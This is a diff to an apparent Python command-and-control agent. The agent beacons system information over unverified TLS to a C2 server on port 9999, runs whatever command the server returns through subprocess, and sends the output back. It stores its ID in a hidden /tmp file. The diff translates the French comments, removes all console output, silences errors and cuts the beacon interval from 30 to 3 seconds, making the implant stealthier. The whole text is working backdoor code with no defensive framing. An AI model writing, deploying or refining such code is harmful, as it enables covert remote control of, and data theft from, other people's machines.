@@ -10,9 +10,9 @@ import sys
 import ssl
 
 
-C2_IP = 'IP_HOST'  # À adapter selon ton réseau
+C2_IP = IP_HOST # Adapt according to your network
 C2_PORT = 9999
-AGENT_ID_FILE = "/tmp/.conf-C0"  # fichier pour conserver le même ID entre sessions
+AGENT_ID_FILE = "/tmp/.conf-C0"  # File to retain the same ID between sessions
 
 def get_python_version():
     return sys.version.split()[0]
@@ -28,7 +28,7 @@ def get_agent_id():
 
 def get_ip_address():
     try:
-        # essaie de se connecter à l'extérieur pour récupérer l'IP locale réelle
+        # Try to connect externally to retrieve the actual local IP
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.connect(("8.8.8.8", 80))
         ip = s.getsockname()[0]
@@ -56,7 +56,7 @@ def get_system_info():
 def send_to_c2():
     data = get_system_info()
     context = ssl.create_default_context()
-    # Ignore la vérification si c’est un certificat auto-signé
+    # Ignore verification if it’s a self-signed certificate
     context.check_hostname = False
     context.verify_mode = ssl.CERT_NONE
 
@@ -64,19 +64,16 @@ def send_to_c2():
         with socket.create_connection((C2_IP, C2_PORT)) as sock:
             with context.wrap_socket(sock, server_hostname=C2_IP) as ssock:
                 ssock.sendall(json.dumps(data).encode())
-                print("[+] Données envoyées au serveur C2")
 
-                # Attente de commande
+                # Waiting for command
                 response = ssock.recv(4096).decode()
                 if response:
                     res_data = json.loads(response)
                     command = res_data.get("command")
                     if command:
-                        print(f"[!] Reçu une commande : {command}")
                         result = subprocess.getoutput(command)
-                        print(f"[=] Résultat de la commande :\n{result}")
 
-                        # Nouvelle connexion pour envoyer le résultat
+                        # New connection to send the result
                         time.sleep(1)
                         with socket.create_connection((C2_IP, C2_PORT)) as result_sock:
                             with context.wrap_socket(result_sock, server_hostname=C2_IP) as ssl_result_sock:
@@ -85,10 +82,17 @@ def send_to_c2():
                                     "result": result
                                 }
                                 ssl_result_sock.sendall(json.dumps(result_payload).encode())
+
+                                # Optional: read server response (avoid broken pipe)
+                                try:
+                                    ssl_result_sock.settimeout(2)
+                                    server_ack = ssl_result_sock.recv(1024).decode()
+                                except socket.timeout:
+                                    pass
     except Exception as e:
-        print(f"[-] Erreur de connexion sécurisée : {e}")
+        pass
 
 if __name__ == "__main__":
     while True:
         send_to_c2()
-        time.sleep(30)
+        time.sleep(3) 
